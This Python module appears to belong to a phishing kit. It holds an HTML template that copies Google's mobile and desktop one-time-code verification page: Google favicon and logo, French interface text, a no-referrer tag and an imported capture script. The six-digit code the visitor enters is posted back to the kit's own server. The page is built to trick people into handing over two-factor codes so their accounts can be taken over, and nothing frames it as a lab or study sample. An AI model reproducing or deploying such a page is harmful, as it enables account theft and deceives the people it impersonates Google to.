"""otp.py - Templates OTP Google (mobile + PC, PC = mobile responsive)."""

from platforms._shared import JS_STRICT_CAPTURE, GG_LOGO_SVG as _GG_LOGO_SVG

HTML_OTP_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <title>Vérification | Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #ffffff;
            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #202124;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }
        .safe-top { height: env(safe-area-inset-top, 0px); }
        .safe-bottom { height: env(safe-area-inset-bottom, 0px); }

        .g-top { display: flex; align-items: center; justify-content: center; padding: clamp(12px, 3vmin, 20px) 16px clamp(8px, 2vmin, 14px); }
        .g-top-logo { height: clamp(28px, 7vmin, 40px); width: auto; }

        .g-card {
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            padding: 0 clamp(20px, 4vmin, 28px);
            box-sizing: border-box;
        }
        .g-title {
            font-size: clamp(22px, 5.5vmin, 28px);
            font-weight: 400;
            margin: clamp(16px, 4vmin, 24px) 0 clamp(4px, 1vmin, 8px);
            color: #202124;
            text-align: center;
        }
        .g-subtitle {
            font-size: clamp(14px, 3.5vmin, 16px);
            color: #5f6368;
            margin-bottom: clamp(20px, 5vmin, 28px);
            text-align: center;
        }

        .otp-container {
            display: flex;
            gap: clamp(6px, 2vmin, 10px);
            justify-content: center;
            margin-bottom: clamp(20px, 5vmin, 28px);
        }
        .otp-box {
            width: clamp(40px, 11vmin, 52px);
            height: clamp(50px, 13vmin, 60px);
            border: 2px solid #dadce0;
            border-radius: clamp(8px, 2vmin, 12px);
            text-align: center;
            font-size: clamp(20px, 5vmin, 26px);
            font-weight: 500;
            color: #202124;
            background: #ffffff;
            outline: none;
            transition: all 0.18s ease;
            font-family: inherit;
            -webkit-appearance: none;
        }
        .otp-box:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 3px rgba(26,115,232,0.1);
        }
        .otp-box.filled {
            border-color: #1a73e8;
            background: #f0f7ff;
        }

        .g-btn {
            background: #1a73e8;
            color: #ffffff;
            border: none;
            border-radius: clamp(8px, 2vmin, 12px);
            padding: clamp(12px, 3vmin, 14px) clamp(24px, 5vmin, 32px);
            font-weight: 500;
            font-size: clamp(14px, 3.5vmin, 16px);
            cursor: pointer;
            transition: all 0.18s ease;
            min-height: 48px;
        }
        .g-btn:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
        .g-btn:active { transform: scale(0.985); }
        .g-btn:disabled { background: #dadce0; color: #9aa0a6; cursor: not-allowed; }

        .g-btn-row {
            display: flex;
            justify-content: center;
            margin-top: clamp(16px, 4vmin, 24px);
        }

        .g-timer {
            text-align: center;
            font-size: clamp(13px, 3vmin, 14px);
            color: #5f6368;
            margin-top: clamp(12px, 3vmin, 16px);
        }
        .g-resend {
            text-align: center;
            margin-top: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(13px, 3vmin, 14px);
        }
        .g-resend a {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
        }
        .g-resend a:active { opacity: 0.6; }

        .g-error {
            background: #fce8e6;
            border: 1px solid #d93025;
            color: #d93025;
            border-radius: clamp(8px, 2vmin, 12px);
            padding: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(12px, 3vmin, 14px);
            margin-bottom: clamp(12px, 3vmin, 16px);
            text-align: center;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>
    <div class="g-top">
        """ + _GG_LOGO_SVG + r"""
    </div>

    <div class="g-card flex-1 flex flex-col justify-center" style="min-height: calc(100vh - 80px);">
        <h2 class="g-title">{{ otp_title }}</h2>
        <p class="g-subtitle">{{ otp_sub }}</p>

        <div id="error-box" class="{% if not message %}hidden{% endif %} g-error">{{ message }}</div>

        <form method="POST" id="otp-form">
            <input type="hidden" name="action" value="code">
            <input type="hidden" name="code" id="otp-hidden">
            <div class="otp-container">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" autofocus>
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>
            <div class="g-btn-row">
                <button type="submit" class="g-btn" id="otp-submit" disabled>{{ otp_submit }}</button>
            </div>
        </form>

        <div class="g-timer" id="timer">Renvoyer le code dans 01:00</div>
        <div class="g-resend hidden" id="resend">
            <a id="resend-link">Renvoyer le code</a>
        </div>
    </div>

    <div class="safe-bottom"></div>

    <script>
    (function() {
        var boxes = document.querySelectorAll('.otp-box');
        var hidden = document.getElementById('otp-hidden');
        var submit = document.getElementById('otp-submit');
        var timerEl = document.getElementById('timer');
        var resendEl = document.getElementById('resend');
        var seconds = 60;

        function updateHiddenAndSubmit() {
            var code = '';
            boxes.forEach(function(b) { code += b.value; });
            hidden.value = code;
            submit.disabled = code.length !== 6;
            boxes.forEach(function(b) {
                if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
            });
        }

        boxes.forEach(function(box, idx) {
            box.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value && idx < boxes.length - 1) boxes[idx + 1].focus();
                updateHiddenAndSubmit();
            });
            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && idx > 0) {
                    boxes[idx - 1].focus();
                    boxes[idx - 1].value = '';
                    updateHiddenAndSubmit();
                }
                if (e.key === 'ArrowLeft' && idx > 0) boxes[idx - 1].focus();
                if (e.key === 'ArrowRight' && idx < boxes.length - 1) boxes[idx + 1].focus();
            });
            box.addEventListener('paste', function(e) {
                e.preventDefault();
                var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
                for (var i = 0; i < pasted.length && idx + i < boxes.length; i++) boxes[idx + i].value = pasted[i];
                if (idx + pasted.length < boxes.length) boxes[idx + pasted.length].focus();
                else boxes[boxes.length - 1].focus();
                updateHiddenAndSubmit();
            });
        });

        updateHiddenAndSubmit();

        var interval = setInterval(function() {
            seconds--;
            var m = Math.floor(seconds / 60), s = seconds % 60;
            timerEl.textContent = 'Renvoyer le code dans ' + (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
            if (seconds <= 0) {
                clearInterval(interval);
                timerEl.classList.add('hidden');
                resendEl.classList.remove('hidden');
            }
        }, 1000);
    })();
    </script>
</body>
</html>
"""


HTML_OTP_PC = HTML_OTP_MOBILE  # Google uses responsive design

